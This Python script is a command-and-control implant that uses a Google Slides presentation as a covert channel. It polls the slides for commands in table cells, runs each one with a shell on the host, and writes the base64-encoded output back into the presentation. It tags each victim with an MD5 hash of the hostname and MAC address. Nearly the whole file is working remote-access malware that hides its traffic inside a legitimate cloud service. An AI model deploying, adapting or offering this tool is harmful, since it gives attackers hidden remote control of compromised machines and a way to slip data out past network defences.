from google.oauth2 import service_account
from googleapiclient.discovery import build
import base64
import subprocess
import uuid
import hashlib
import socket
from datetime import datetime
import time

# Edit your JSON credentials information
service_account_info = None
# Edit your presentation ID
presentation_id = ''

def get_current_date_time():
    now = datetime.now()
    formatted_date_time = now.strftime("%d-%m-%y %H:%M:%S")
    return formatted_date_time

def generate_hash_md5():
    hostname = socket.gethostname()
    mac_address = ':'.join(hex(uuid.getnode())[2:].zfill(12)[i:i+2] for i in range(0, 12, 2))
    data = hostname + mac_address
    md5_hash = hashlib.md5(data.encode()).hexdigest()
    print(f"[+] Generated unique ID: {md5_hash}")
    return md5_hash

def execute_command(command):
    print(f"[+] Executing command: '{command}'")
    try:
        output = subprocess.check_output(command, shell=True)
        if output == b'':
            encoded_output = base64.b64encode("no output".encode()).decode('utf-8')
        else:
            encoded_output = base64.b64encode(output).decode('utf-8')
        return encoded_output
    except subprocess.CalledProcessError as e:
        print(f"[-] Error during execution: {e}")
        return None

def insert_text_into_cell(service, presentation_id, table_id, row_index, column_index, text):
    requests = [{
        'insertText': {
            'objectId': table_id,
            'cellLocation': {
                'rowIndex': row_index,
                'columnIndex': column_index,
            },
            'text': text,
            'insertionIndex': 0,
        }
    }]
    
    body = {'requests': requests}
    response = service.presentations().batchUpdate(presentationId=presentation_id, body=body).execute()



def main():    
    SCOPES = ['https://www.googleapis.com/auth/presentations']
    credentials = service_account.Credentials.from_service_account_info(service_account_info, scopes=SCOPES)
    service = build('slides', 'v1', credentials=credentials)
    sleep_time = 20
    while True:
        presentation = service.presentations().get(presentationId=presentation_id).execute()
        found = False
        
        for slide in presentation.get('slides', []):
            for elem in slide.get('pageElements', []):
                if 'table' in elem:
                    table = elem['table']
                    for row_index, row in enumerate(table['tableRows']):
                        cell_text = ''
                        first_cell_text_elements = row['tableCells'][0].get('text', {}).get('textElements', [])
                        for text_element in first_cell_text_elements:
                            if 'textRun' in text_element:
                                cell_text += text_element['textRun'].get('content', '')
                        if cell_text.strip() == "":
                            
                            second_cell_text_elements = row['tableCells'][1].get('text', {}).get('textElements', [])
                            for text_element in second_cell_text_elements:
                                if 'textRun' in text_element:
                                    command = text_element['textRun'].get('content', '').strip()
                                    if command:
                                        dateNow = get_current_date_time()
                                        output = execute_command(command)
                                        if output is not None:
                                            table_id = elem['objectId']
                                            insert_text_into_cell(service, presentation_id, table_id, row_index, 0, dateNow)
                                            insert_text_into_cell(service, presentation_id, table_id, row_index, 2, output)
                                        
                        if not found:
                            print("[!] Command not found")
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()
    
